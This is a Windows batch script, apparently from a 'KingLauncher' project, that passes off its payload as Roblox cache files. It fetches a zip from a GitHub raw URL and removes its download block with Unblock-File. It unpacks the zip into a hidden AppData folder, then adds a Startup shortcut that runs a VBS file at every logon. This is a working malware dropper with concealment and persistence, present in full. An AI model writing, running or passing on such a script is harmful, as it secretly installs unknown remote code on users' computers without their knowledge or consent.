@echo off
setlocal

set "URL=https://raw.githubusercontent.com/sebaff123451/KingLauncher/main/RobloxCache.zip"
set "DEST=%APPDATA%\RobloxCache"
set "ZIP=%APPDATA%\RobloxCache.zip"

mkdir "%DEST%" >nul 2>&1

powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP%'"

powershell -Command "Unblock-File -Path '%ZIP%'"

powershell -Command "Expand-Archive -Path '%ZIP%' -DestinationPath '%APPDATA%' -Force"

if exist "%APPDATA%\RobloxCache\RobloxCache" (
    move "%APPDATA%\RobloxCache\RobloxCache\*" "%APPDATA%\RobloxCache\"
    rmdir "%APPDATA%\RobloxCache\RobloxCache"
)

del "%ZIP%" >nul 2>&1

attrib +h "%DEST%"

powershell -Command ^
"$s=(New-Object -COM WScript.Shell).CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Starter.lnk'); ^
$s.TargetPath='%APPDATA%\RobloxCache\Starter.vbs'; ^
$s.WorkingDirectory='%APPDATA%\RobloxCache'; ^
$s.Save()"

exit